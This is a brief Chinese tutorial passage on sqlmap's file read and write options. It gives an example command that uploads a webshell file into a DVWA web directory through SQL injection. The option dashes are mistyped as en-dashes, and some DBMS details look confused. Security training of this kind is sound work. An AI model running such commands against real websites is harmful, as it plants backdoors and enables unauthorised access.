### 读取与写入文件

首先找需要网站的物理路径，其次需要有可写或可读权限。

| –file-read=RFILE | 从后端的数据库管理系统文件系统读取文件 （物理路径） |
| :--- | :--- |
| –file-write=WFILE | 编辑后端的数据库管理系统文件系统上的本地文件 （mysql xp\_shell） |
| –file-dest=DFILE | 后端的数据库管理系统写入文件的绝对路径 |

```
#示例：
sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write 
“f:\webshell\1112.php”
```

\#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp\_dirtree函数）

